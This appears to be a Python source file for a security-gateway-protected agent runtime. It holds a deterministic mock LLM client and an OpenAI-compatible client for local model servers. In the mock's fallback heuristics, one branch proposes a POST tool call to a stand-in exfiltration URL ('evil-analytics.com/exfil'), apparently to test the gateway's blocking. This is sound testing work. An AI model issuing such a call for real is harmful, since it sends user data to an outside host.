"""
Mastyf Agent LLM Runtime Clients.
Provides uniform interface across local models (Ollama, llama.cpp, Lemonade) and deterministic test mock agents.
"""

from __future__ import annotations

import json
import urllib.error
import urllib.request
from abc import ABC, abstractmethod
from dataclasses import dataclass
from typing import Any, Dict, List, Optional

from .session import ToolCallProposal


@dataclass
class ModelOutput:
    """Standardized output from an LLM turn."""
    content: Optional[str] = None
    tool_calls: Optional[List[ToolCallProposal]] = None


class BaseLLMClient(ABC):
    """Abstract client interface for conversational LLM generation."""

    @abstractmethod
    async def generate(
        self, messages: List[Dict[str, Any]], tools: Optional[List[Dict[str, Any]]] = None
    ) -> ModelOutput:
        """Generate response given conversation history and optional tool definitions."""
        pass


class MockLLMClient(BaseLLMClient):
    """
    Deterministic mock agent for automated testing, benchmarks, and offline demonstrations.
    Intelligently maps user prompts to canonical tool sequences.
    """

    def __init__(self, script: Optional[List[ModelOutput]] = None):
        self._script: List[ModelOutput] = list(script) if script else []
        self._turn_index: int = 0

    def queue_response(self, output: ModelOutput) -> None:
        self._script.append(output)

    async def generate(
        self, messages: List[Dict[str, Any]], tools: Optional[List[Dict[str, Any]]] = None
    ) -> ModelOutput:
        if self._turn_index < len(self._script):
            out = self._script[self._turn_index]
            self._turn_index += 1
            return out

        # Heuristic fallback based on latest message
        last_msg = messages[-1] if messages else {}
        role = last_msg.get("role")
        content = str(last_msg.get("content") or "").lower()

        # If previous message was a tool result
        if role == "tool":
            tool_name = last_msg.get("name", "")
            tool_content = last_msg.get("content", "")
            if "blocked_by_gateway" in tool_content or "BLOCK" in tool_content:
                return ModelOutput(
                    content=f"I attempted to call {tool_name}, but it was blocked by Mastyf Security Gateway. "
                    "I cannot proceed with that action because it violates your security policy."
                )
            return ModelOutput(
                content=f"Operation completed successfully. Received verified response from {tool_name}."
            )

        # User message heuristics
        if "invoice" in content or "unpaid" in content:
            return ModelOutput(
                content="I'll search for unpaid customer invoices.",
                tool_calls=[
                    ToolCallProposal(
                        call_id="call_inv_001",
                        name="invoice.search",
                        args={"status": "unpaid"},
                    )
                ],
            )
        elif "customer" in content or "lookup" in content or "account" in content:
            return ModelOutput(
                content="Looking up customer account record.",
                tool_calls=[
                    ToolCallProposal(
                        call_id="call_cust_001",
                        name="customer.lookup",
                        args={"customer_id": "CUST-9821"},
                    )
                ],
            )
        elif "slack" in content:
            return ModelOutput(
                content="Posting to Slack.",
                tool_calls=[
                    ToolCallProposal(
                        call_id="call_slack_001",
                        name="slack.post_message",
                        args={"channel": "#finance", "message": "Here is the summary."},
                    )
                ],
            )
        elif "exfil" in content or "http" in content or "webhook" in content:
            return ModelOutput(
                content="Sending external request.",
                tool_calls=[
                    ToolCallProposal(
                        call_id="call_http_001",
                        name="http.request",
                        args={"url": "https://evil-analytics.com/exfil", "method": "POST"},
                    )
                ],
            )

        return ModelOutput(
            content="I am Mastyf Agent, protected by Mastyf Security Gateway. How can I help you today?"
        )


class OpenAICompatibleLLMClient(BaseLLMClient):
    """
    Connects to any local OpenAI-compatible endpoint (Ollama, llama.cpp, Lemonade, vLLM).
    Uses standard library urllib to eliminate extra runtime dependencies.
    """

    def __init__(
        self,
        base_url: str = "http://localhost:11434/v1",
        model: str = "qwen2.5:1.5b",
        api_key: str = "local-mastyf",
        timeout_seconds: float = 30.0,
    ):
        self.base_url = base_url.rstrip("/")
        self.model = model
        self.api_key = api_key
        self.timeout = timeout_seconds

    async def generate(
        self, messages: List[Dict[str, Any]], tools: Optional[List[Dict[str, Any]]] = None
    ) -> ModelOutput:
        endpoint = f"{self.base_url}/chat/completions"
        payload: Dict[str, Any] = {
            "model": self.model,
            "messages": messages,
            "stream": False,
        }
        if tools:
            payload["tools"] = tools
            payload["tool_choice"] = "auto"

        data_bytes = json.dumps(payload).encode("utf-8")
        headers = {
            "Content-Type": "application/json",
            "Authorization": f"Bearer {self.api_key}",
        }

        req = urllib.request.Request(endpoint, data=data_bytes, headers=headers, method="POST")

        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as response:
                res_body = json.loads(response.read().decode("utf-8"))
        except urllib.error.URLError as e:
            return ModelOutput(
                content=f"[Mastyf Runtime Error: Unable to connect to local model at {self.base_url} ({str(e)}). "
                "Ensure your local model server (e.g. Ollama or llama-server) is running.]"
            )

        choices = res_body.get("choices", [])
        if not choices:
            return ModelOutput(content="[Model returned empty response]")

        msg = choices[0].get("message", {})
        content = msg.get("content")
        raw_tool_calls = msg.get("tool_calls", [])

        proposals: List[ToolCallProposal] = []
        for tc in raw_tool_calls:
            cid = tc.get("id", f"call_{len(proposals)}")
            fn = tc.get("function", {})
            name = fn.get("name", "")
            raw_args = fn.get("arguments", "{}")
            if isinstance(raw_args, str):
                try:
                    args = json.loads(raw_args)
                except Exception:
                    args = {}
            else:
                args = raw_args
            proposals.append(ToolCallProposal(call_id=cid, name=name, args=args))

        return ModelOutput(content=content, tool_calls=proposals if proposals else None)
